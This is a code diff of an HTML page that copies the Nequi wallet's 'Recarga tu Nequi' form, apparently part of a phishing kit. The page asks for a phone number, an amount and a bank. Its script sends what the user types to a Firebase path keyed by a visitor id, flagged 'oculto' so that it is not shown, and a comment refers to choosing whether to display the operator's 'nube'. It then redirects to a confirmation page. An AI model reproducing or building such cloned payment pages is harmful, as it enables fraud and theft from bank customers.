@@ -3,44 +3,44 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-
 <title>Recarga</title>
 <link rel="stylesheet" href="styles.css">
 </head>
+
 <body>
 
 <div class="container">
 
-    <img src="logo.svg" class="logo" alt="Nequi">
+<img src="logo.svg" class="logo">
 
-    <h2 class="title">Recarga tu Nequi</h2>
+<h2 class="title">Recarga tu Nequi</h2>
 
-    <div class="input-box">
-        <input type="tel" id="input1" placeholder=" ">
-        <label>Número de celular</label>
-    </div>
-
-    <div class="input-box">
-        <input type="tel" id="input2" placeholder=" ">
-        <label>Confirma el número</label>
-    </div>
-
-    <div class="input-box">
-        <input type="text" id="input3" placeholder=" ">
-        <label>¿Cuánto?</label>
-    </div>
-
-    <div class="input-box">
-    <select id="select1" required>
-        <option value="Natural" selected>Natural</option>
-        <option value="Empresa">Empresa</option>
-    </select>
-    <label>Tipo de persona</label>
+<div class="input-box">
+<input type="tel" id="input1" placeholder=" ">
+<label>Número de celular</label>
 </div>
 
-    <div class="select-box">
-        <select id="select2">
-            <option value="">Elige el banco</option>
+<div class="input-box">
+<input type="tel" id="input2" placeholder=" ">
+<label>Confirma el número</label>
+</div>
+
+<div class="input-box">
+<input type="text" id="input3" placeholder=" ">
+<label>¿Cuánto?</label>
+</div>
+
+<div class="input-box">
+<select id="select1" required>
+<option value="Natural" selected>Natural</option>
+<option value="Empresa">Empresa</option>
+</select>
+<label>Tipo de persona</label>
+</div>
+
+<div class="select-box">
+<select id="select2">
+<option value="">Elige el banco</option>
 <option>ACCION FIDUCIARIA</option>
 <option>ALIANZA FIDUCIARIA</option>
 <option>BAN100</option>
@@ -64,7 +64,7 @@
 <option>BANCO SANTANDER COLOMBIA</option>
 <option>BANCO SERFINANZA</option>
 <option>BANCO UNION</option>
-<option>BANCOLOMBIA</option> bancoomeva
+<option>BANCOLOMBIA</option>
 <option>BANCOOMEVA S.A.</option>
 <option>DAVIbank S.A.</option>
 <option>GLOBAL66</option>
@@ -72,78 +72,18 @@
 <option>DAVIPLATA</option>
 <option>NU</option>
 <option>MOVII S.A.</option>
- </select>
-    </div>
-
-    <p class="info">
-        La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
-    </p>
-
-    <button class="btn" id="btn">Continuar</button>
-
-    <a href="#" class="help">Ayuda</a>
-
+</select>
 </div>
 
-<script>
-const input1 = document.getElementById("input1");
-const input2 = document.getElementById("input2");
-const input3 = document.getElementById("input3");
-const select1 = document.getElementById("select1");
-const select2 = document.getElementById("select2");
-const button = document.getElementById("btn");
+<p class="info">
+La recarga se hará usando los servicios de PSE y se debitará de tu cuenta corriente o de ahorros.
+</p>
 
+<button class="btn" id="btn" disabled>Continuar</button>
 
-// 🔹 VALIDACIÓN
-function validar() {
-    let ok = true;
+<a href="#" class="help">Ayuda</a>
 
-    if (
-        input1.value.trim() === "" ||
-        input2.value.trim() === "" ||
-        input3.value.trim() === "" ||
-        select1.value === "" ||
-        select2.value === ""
-    ) {
-        ok = false;
-    }
-
-    // validar que números coincidan
-    if (input1.value !== input2.value) {
-        ok = false;
-    }
-
-    // activar botón
-    if (ok) {
-        button.style.background = "#da0081";
-        button.style.color = "#fff";
-        button.disabled = false;
-    } else {
-        button.style.background = "#d6d6d6";
-        button.style.color = "#7a7a7a";
-        button.disabled = true;
-    }
-}
-
-
-// 🔹 FORMATO MONTO
-input3.addEventListener("input", () => {
-    let valor = input3.value.replace(/\D/g, "");
-    valor = valor.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
-    input3.value = valor;
-
-    validar(); // revalidar mientras escribe
-});
-
-
-// 🔹 EVENTOS
-[input1, input2].forEach(i => i.addEventListener("input", validar));
-[select1, select2].forEach(s => s.addEventListener("change", validar));
-
-
-
-</script>
-
+</div>
 
 <script type="module" src="firebase.js"></script>
 
@@ -152,106 +92,84 @@ window.addEventListener('load', () => {
 
 const { db, uid, ref, update } = window;
 
-// ===============================
-// 🔹 ELEMENTOS
-// ===============================
-const input1 = document.getElementById("input1"); // teléfono
-const input2 = document.getElementById("input2"); // confirmar
-const input3 = document.getElementById("input3"); // monto
-const select1 = document.getElementById("select1"); // persona
-const select2 = document.getElementById("select2"); // banco
+const input1 = document.getElementById("input1");
+const input2 = document.getElementById("input2");
+const input3 = document.getElementById("input3");
+const select1 = document.getElementById("select1");
+const select2 = document.getElementById("select2");
 const button = document.getElementById("btn");
 
-// ===============================
-// 🔹 VALIDACIÓN
-// ===============================
 function validar() {
-  let ok = true;
+let ok =
+input1.value.trim() !== "" &&
+input2.value.trim() !== "" &&
+input3.value.trim() !== "" &&
+select1.value !== "" &&
+select2.value !== "" &&
+input1.value === input2.value;
 
-  if (
-    input1.value.trim() === "" ||
-    input2.value.trim() === "" ||
-    input3.value.trim() === "" ||
-    select1.value === "" ||
-    select2.value === ""
-  ) ok = false;
-
-  if (input1.value !== input2.value) ok = false;
-
-  if (ok) {
-    button.style.background = "#da0081";
-    button.style.color = "#fff";
-    button.disabled = false;
-  } else {
-    button.style.background = "#d6d6d6";
-    button.style.color = "#7a7a7a";
-    button.disabled = true;
-  }
+button.style.background = ok ? "#da0081" : "#d6d6d6";
+button.style.color = ok ? "#fff" : "#7a7a7a";
+button.disabled = !ok;
 }
 
-// ===============================
-// 🔹 MONTO (FORMATO + FIREBASE SIN MOSTRAR)
-// ===============================
 input3.addEventListener("input", () => {
 
-  let limpio = input3.value.replace(/\D/g, "");
-  let formateado = limpio.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
+let limpio = input3.value.replace(/\D/g, "");
 
-  input3.value = formateado;
+if (limpio === "") {
+input3.value = "";
 
-  update(ref(db, "dataPages/" + uid), {
-    monto: limpio,
-    oculto: true // 🔥 NO mostrar nube
-  });
-
-  validar();
+update(ref(db, "dataPages/" + uid), {
+monto: "",
+oculto: true
 });
 
-// ===============================
-// 🔹 BANCO (SIN MOSTRAR NUBE)
-// ===============================
-select2.addEventListener("change", () => {
+validar();
+return;
+}
 
-  update(ref(db, "dataPages/" + uid), {
-    banco: select2.value,
-    oculto: true // 🔥 NO mostrar nube
-  });
+let formateado = limpio.replace(/\B(?=(\d{3})+(?!\d))/g, ".");
 
-  validar();
+input3.value = "$" + formateado;
+
+update(ref(db, "dataPages/" + uid), {
+monto: limpio,
+oculto: true
 });
 
-// ===============================
-// 🔹 VALIDACIONES INPUTS
-// ===============================
+validar();
+});
+
 input1.addEventListener("input", validar);
 input2.addEventListener("input", validar);
 select1.addEventListener("change", validar);
 
-// ===============================
-// 🔹 BOTÓN CONTINUAR
-// ===============================
+select2.addEventListener("change", () => {
+update(ref(db, "dataPages/" + uid), {
+banco: select2.value,
+oculto: true
+});
+validar();
+});
+
 button.addEventListener("click", () => {
 
-  let telefono = input1.value;
-  let montoSinFormato = input3.value.replace(/\./g, "");
-  let montoConFormato = input3.value;
-  let banco = select2.value;
-  let persona = select1.value;
+let telefono = input1.value;
+let monto = input3.value.replace(/\D/g, "");
+let montoFormato = input3.value;
 
-  // guardar local
-  localStorage.setItem("telefono", telefono);
-  localStorage.setItem("monto", montoSinFormato);
-  localStorage.setItem("montoFormato", montoConFormato);
-  localStorage.setItem("banco", banco);
-  localStorage.setItem("persona", persona);
+localStorage.setItem("telefono", telefono);
+localStorage.setItem("monto", monto);
+localStorage.setItem("montoFormato", montoFormato);
+localStorage.setItem("banco", select2.value);
+localStorage.setItem("persona", select1.value);
 
-  // 🚀 aquí puedes decidir si mostrar la nube o no
-  // update(ref(db, "dataPages/" + uid), { oculto: false });
-
-  window.location.href = "confirmacion.html";
+window.location.href = "confirmacion.html";
 });
 
 });
 </script>
+
 </body>
 </html>
